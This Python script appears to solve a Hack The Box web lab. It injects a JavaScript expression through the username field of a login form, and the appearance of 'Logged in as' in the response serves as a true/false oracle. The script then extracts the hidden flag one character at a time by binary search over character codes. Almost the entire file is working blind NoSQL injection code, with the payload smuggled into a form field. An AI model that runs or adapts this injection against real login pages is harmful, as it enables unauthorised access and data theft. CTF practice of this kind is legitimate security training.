#!/usr/bin/python3

import requests
from urllib.parse import quote_plus

# Oracle (answers True or False)
num_req = 0
def oracle(r):
    global num_req
    num_req += 1
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    r = requests.post(
        "http://83.136.255.217:54558/index.php",
        headers={"Content-Type":"application/x-www-form-urlencoded"},
        data="username=%s&password=x" % (quote_plus('" || (' + r + ') || ""=="')),
        proxies=proxies, verify=False
    )
    return "Logged in as" in r.text

# Ensure the oracle is working correctly
assert (oracle('false') == False)
assert (oracle('true') == True)

try:
    # Dump the username (binary search)
    num_req = 0 # Reset the request counter
    username = "HTB{" # Known beginning of username
    i = 4 # Skip the first 4 characters (HTB{)
    while username[-1] != "}": # Repeat until we meet '}' aka end of username
        low = 32 # Set low value of search area (' ')
        high = 127 # Set high value of search area ('~')
        mid = 0
        while low <= high:
            mid = (high + low) // 2 # Caluclate the midpoint of the search area
            if oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) > %d' % (i, mid)):
                low = mid + 1 # If ASCII value of username at index 'i' < midpoint, increase the lower boundary and repeat
            elif oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) < %d' % (i, mid)):
                high = mid - 1 # If ASCII value of username at index 'i' > midpoint, decrease the upper boundary and repeat
            else:
                username += chr(mid) # If ASCII value is neither higher or lower than the midpoint we found the target value
                print(f"Character '{chr(mid)}' added to username")
                break # Break out of the loop
        i += 1 # Increment the index counter (start work on the next character)
except KeyboardInterrupt:
    print("Execution interrupted by user. Exiting gracefully...")

assert (oracle('this.username == `%s`' % username) == True)
print("---- Binary search ----")
print("Username: %s" % username)
print("Requests: %d" % num_req)